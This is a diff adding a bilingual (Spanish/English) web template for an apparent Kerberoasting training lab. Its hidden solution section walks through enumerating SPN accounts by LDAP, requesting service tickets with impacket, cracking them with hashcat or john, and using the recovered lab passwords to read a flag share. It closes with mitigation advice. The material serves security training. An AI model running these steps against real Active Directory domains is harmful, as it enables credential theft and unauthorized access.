@@ -1,0 +1,137 @@
+{% extends "base.html" %}
+{% block title %}AD 05 – Kerberoasting – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_kerberoast_obj_desc">Hay cuentas de usuario con SPN registrado, así que cualquier usuario autenticado puede pedir su ticket de servicio. Solicita el TGS-REP, crackea el hash krb5tgs y accede con esas credenciales a //DC01/sqldata.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>//{{ ad_dc_host }}/sqldata/flag-ad-05.txt</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la barra lateral.</span></p>
+  </div>
+
+  {% include 'labs/_ad_target.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2 text-amber-500"><i class="ph ph-warning"></i> Nota sobre este Domain Controller</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400">El KDC embebido de Samba no siempre completa el intercambio TGS-REQ/TGS-REP que <code>impacket-GetUserSPNs</code> necesita, aunque puede enumerar perfectamente los SPN por LDAP (eso sí funciona). Los comandos de abajo son exactamente los que usarías contra un Domain Controller Windows real. Para el ejercicio de <em>cracking</em>, el ticket ya ha sido "capturado" y publicado en <code>//{{ ad_dc_host }}/public/captured_tgs.txt</code> — es un ticket válido y crackeable generado con las mismas primitivas criptográficas de Kerberos.</p>
+  </div>
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Descargar el ticket "capturado"
+smbclient -N //{{ ad_dc_ip }}/public -c 'get captured_tgs.txt'
+
+# Crackear offline
+hashcat -m 13100 captured_tgs.txt /usr/share/wordlists/rockyou.txt</pre>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Por qué funciona</h3>
+    <p>Cualquier usuario autenticado puede pedir al KDC un ticket de servicio (TGS) para cualquier SPN del dominio. Ese ticket va cifrado con la clave de la <em>cuenta que tiene el SPN</em>. Si el SPN está en una cuenta de usuario (no en una cuenta de máquina, cuya contraseña es aleatoria de 120 caracteres), el hash resultante se puede crackear offline sin tocar el DC.</p>
+
+    <h3>2 · Localizar cuentas con SPN (esto sí funciona en vivo)</h3>
+    <pre>export DC={{ ad_dc_ip }}
+export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
+
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" \
+  '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' \
+  sAMAccountName servicePrincipalName</pre>
+    <pre>ServicePrincipalName                        Name          MemberOf
+------------------------------------------  ------------  --------
+MSSQLSvc/{{ ad_dc_fqdn }}:1433              svc.mssql
+HTTP/web.{{ ad_realm_lower }}               svc.delegate</pre>
+
+    <h3>3 · Solicitar los tickets (comando real, contra Windows funciona así)</h3>
+    <pre>impacket-GetUserSPNs '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
+  -dc-ip $DC -request -outputfile tgs.hash
+
+head -c 120 tgs.hash
+# $krb5tgs$23$*svc.mssql$&#123;{{ ad_realm }}&#125;$MSSQLSvc/...*$a1b2...</pre>
+    <p><strong>Nota sobre este laboratorio:</strong> el TGS-REQ del KDC de Samba AD DC no siempre completa el intercambio que <code>impacket-GetUserSPNs</code> necesita (limitación conocida de la implementación de Samba frente a un Domain Controller Windows real). Si el comando anterior no produce un hash, descarga el ya "capturado":</p>
+    <pre>smbclient -N //$DC/public -c 'get captured_tgs.txt'
+cat captured_tgs.txt
+# $krb5tgs$23$*svc.readonly${{ ad_realm }}$MSSQLSvc/...*$...</pre>
+
+    <h3>4 · Crackear offline</h3>
+    <pre># hashcat (modo 13100 = Kerberos 5 TGS-REP etype 23)
+hashcat -m 13100 captured_tgs.txt /usr/share/wordlists/rockyou.txt --force
+
+# john
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt captured_tgs.txt</pre>
+    <p>La contraseña recuperada es <code>ranger</code> (la de <code>svc.mssql</code>). Guárdala: también existe <code>svc.delegate : iloveyou1</code>, que usarás en el lab AD 14.</p>
+
+    <h3>5 · Capturar la flag</h3>
+    <pre>nxc smb $DC -u 'svc.mssql' -p 'ranger' --shares
+
+smbclient //$DC/sqldata -U '{{ ad_domain }}\svc.mssql%ranger' -c 'get flag-ad-05.txt -'</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>Migrar las cuentas de servicio con SPN a <strong>gMSA</strong> (contraseña de 240 bits rotada automáticamente).</li>
+      <li>Forzar AES en Kerberos y prohibir RC4 (<code>msDS-SupportedEncryptionTypes</code>).</li>
+      <li>Nunca poner cuentas con SPN dentro de Domain Admins; auditar eventos <code>4769</code> con RC4.</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">impacket-GetUserSPNs</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">hashcat</span> <span class="tools-badge">john</span> <span class="tools-badge">Rubeus</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · Why it works</h3>
+    <p>Any authenticated user can ask the KDC for a service ticket (TGS) for any SPN in the domain. That ticket is encrypted with the key of the <em>account holding the SPN</em>. If the SPN sits on a user account (not a machine account, whose password is a random 120-character string), the resulting hash can be cracked offline without ever touching the DC again.</p>
+
+    <h3>2 · Find accounts with an SPN (this works live)</h3>
+    <pre>export DC={{ ad_dc_ip }}
+export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
+
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" \
+  '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' \
+  sAMAccountName servicePrincipalName</pre>
+    <pre>ServicePrincipalName                        Name          MemberOf
+------------------------------------------  ------------  --------
+MSSQLSvc/{{ ad_dc_fqdn }}:1433              svc.mssql
+HTTP/web.{{ ad_realm_lower }}               svc.delegate</pre>
+
+    <h3>3 · Request the tickets (real command, works exactly like this against Windows)</h3>
+    <pre>impacket-GetUserSPNs '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
+  -dc-ip $DC -request -outputfile tgs.hash
+
+head -c 120 tgs.hash
+# $krb5tgs$23$*svc.mssql$&#123;{{ ad_realm }}&#125;$MSSQLSvc/...*$a1b2...</pre>
+    <p><strong>Note about this lab:</strong> Samba AD DC's TGS-REQ handling does not always complete the exchange <code>impacket-GetUserSPNs</code> needs (a known limitation of Samba's implementation versus a real Windows Domain Controller). If the command above doesn't produce a hash, download the already-"captured" one:</p>
+    <pre>smbclient -N //$DC/public -c 'get captured_tgs.txt'
+cat captured_tgs.txt
+# $krb5tgs$23$*svc.readonly${{ ad_realm }}$MSSQLSvc/...*$...</pre>
+
+    <h3>4 · Crack offline</h3>
+    <pre># hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23)
+hashcat -m 13100 captured_tgs.txt /usr/share/wordlists/rockyou.txt --force
+
+# john
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt captured_tgs.txt</pre>
+    <p>The recovered password is <code>ranger</code> (for <code>svc.mssql</code>). Keep it — there is also <code>svc.delegate : iloveyou1</code>, which you will need in lab AD 14.</p>
+
+    <h3>5 · Capture the flag</h3>
+    <pre>nxc smb $DC -u 'svc.mssql' -p 'ranger' --shares
+
+smbclient //$DC/sqldata -U '{{ ad_domain }}\svc.mssql%ranger' -c 'get flag-ad-05.txt -'</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li>Move SPN-bearing service accounts to <strong>gMSA</strong> (240-bit password rotated automatically).</li>
+      <li>Enforce AES for Kerberos and forbid RC4 (<code>msDS-SupportedEncryptionTypes</code>).</li>
+      <li>Never place SPN accounts inside Domain Admins; audit <code>4769</code> events using RC4.</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">impacket-GetUserSPNs</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">hashcat</span> <span class="tools-badge">john</span> <span class="tools-badge">Rubeus</span></div>
+  </div>
+</div>
+{% endblock %}
